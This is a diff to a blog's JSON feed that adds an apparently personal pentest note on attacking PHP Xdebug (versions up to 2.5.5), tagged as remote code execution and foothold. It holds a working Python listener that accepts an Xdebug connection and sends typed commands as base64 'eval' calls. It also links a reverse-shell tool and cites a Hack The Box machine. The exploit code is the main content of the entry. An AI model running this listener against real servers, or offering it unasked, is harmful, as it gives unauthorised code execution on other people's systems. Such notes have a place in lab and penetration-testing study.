@@ -17,6 +17,30 @@
 "items": [
     
         {
+            "id": "https://mvineza.github.io/spindel/2022/03/11/php-xdebug",
+            "title": "PHP XDebug",
+            "summary": "PHP XDebug",
+            "content_text": "OverviewXdebug is a PHP debugging tool that supports remote debugging of PHP code on the server through source code locally. Xdebug has powerful functions, and there have been many articles about its configuration recently. The idea of digging the attack surface of Xdebug was born a long time ago, and finally I did it today, a day suitable for paddling.Vulnerable Versions  &lt;= 2.5.5Example Exploit Scripts#!/usr/bin/python2import socketip_port = ('0.0.0.0',9000)sk = socket.socket()sk.bind(ip_port)sk.listen(10)conn, addr = sk.accept()while True:    client_data = conn.recv(1024)    print(client_data)    data = raw_input('&gt;&gt; ')    conn.sendall('eval -i 1 -- %s\\x00' % data.encode('base64'))  GitHub - gteissier/xdebug-shell: xdebug reverse shellAlternatives  You can use chrome also to exploit thisReferences  HTB Olympus  https://paper.seebug.org/397/                              [The Exploits of Xdebug in PhpStorm          by Knownsec 404 team          Medium](https://medium.com/@knownsec404team/the-exploits-of-xdebug-in-phpstorm-2ca140e91dc)                    ",
+            "content_html": "<h2 id=\"overview\">Overview</h2><p>Xdebug is a PHP debugging tool that supports remote debugging of PHP code on the server through source code locally. Xdebug has powerful functions, and there have been many articles about its configuration recently. The idea of digging the attack surface of Xdebug was born a long time ago, and finally I did it today, a day suitable for paddling.</p><h2 id=\"vulnerable-versions\">Vulnerable Versions</h2><ul>  <li>&lt;= 2.5.5</li></ul><h2 id=\"example-exploit-scripts\">Example Exploit Scripts</h2><div class=\"language-python highlighter-rouge\"><div class=\"highlight\"><pre class=\"highlight\"><code><span class=\"c1\">#!/usr/bin/python2</span><span class=\"kn\">import</span> <span class=\"nn\">socket</span><span class=\"n\">ip_port</span> <span class=\"o\">=</span> <span class=\"p\">(</span><span class=\"s\">'0.0.0.0'</span><span class=\"p\">,</span><span class=\"mi\">9000</span><span class=\"p\">)</span><span class=\"n\">sk</span> <span class=\"o\">=</span> <span class=\"n\">socket</span><span class=\"p\">.</span><span class=\"n\">socket</span><span class=\"p\">()</span><span class=\"n\">sk</span><span class=\"p\">.</span><span class=\"n\">bind</span><span class=\"p\">(</span><span class=\"n\">ip_port</span><span class=\"p\">)</span><span class=\"n\">sk</span><span class=\"p\">.</span><span class=\"n\">listen</span><span class=\"p\">(</span><span class=\"mi\">10</span><span class=\"p\">)</span><span class=\"n\">conn</span><span class=\"p\">,</span> <span class=\"n\">addr</span> <span class=\"o\">=</span> <span class=\"n\">sk</span><span class=\"p\">.</span><span class=\"n\">accept</span><span class=\"p\">()</span><span class=\"k\">while</span> <span class=\"bp\">True</span><span class=\"p\">:</span>    <span class=\"n\">client_data</span> <span class=\"o\">=</span> <span class=\"n\">conn</span><span class=\"p\">.</span><span class=\"n\">recv</span><span class=\"p\">(</span><span class=\"mi\">1024</span><span class=\"p\">)</span>    <span class=\"k\">print</span><span class=\"p\">(</span><span class=\"n\">client_data</span><span class=\"p\">)</span>    <span class=\"n\">data</span> <span class=\"o\">=</span> <span class=\"nb\">raw_input</span><span class=\"p\">(</span><span class=\"s\">'&gt;&gt; '</span><span class=\"p\">)</span>    <span class=\"n\">conn</span><span class=\"p\">.</span><span class=\"n\">sendall</span><span class=\"p\">(</span><span class=\"s\">'eval -i 1 -- %s</span><span class=\"se\">\\x00</span><span class=\"s\">'</span> <span class=\"o\">%</span> <span class=\"n\">data</span><span class=\"p\">.</span><span class=\"n\">encode</span><span class=\"p\">(</span><span class=\"s\">'base64'</span><span class=\"p\">))</span></code></pre></div></div><ul>  <li><a href=\"https://github.com/gteissier/xdebug-shell\">GitHub - gteissier/xdebug-shell: xdebug reverse shell</a></li></ul><h2 id=\"alternatives\">Alternatives</h2><ul>  <li>You can use <a href=\"https://www.youtube.com/watch?v=7ifJOon5-G8&amp;t=587s\">chrome</a> also to exploit this</li></ul><h2 id=\"references\">References</h2><ul>  <li>HTB Olympus</li>  <li>https://paper.seebug.org/397/</li>  <li>    <table>      <tbody>        <tr>          <td>[The Exploits of Xdebug in PhpStorm</td>          <td>by Knownsec 404 team</td>          <td>Medium](https://medium.com/@knownsec404team/the-exploits-of-xdebug-in-phpstorm-2ca140e91dc)</td>        </tr>      </tbody>    </table>  </li></ul>",
+            "url": "https://mvineza.github.io/spindel/2022/03/11/php-xdebug",
+            
+            
+            
+            "tags": ["php","rce","foothold"],
+            
+            "date_published": "2022-03-11T00:00:00+08:00",
+            "date_modified": "2022-03-11T00:00:00+08:00",
+            
+                "author":  {
+                "name": "spindel",
+                "url": null,
+                "avatar": null
+                }
+                
+            
+        },
+    
+        {
             "id": "https://mvineza.github.io/spindel/2022/03/10/kerberoasting-impacket",
             "title": "Kerberoasting - Impacket",
             "summary": "Kerberoasting - Impacket",
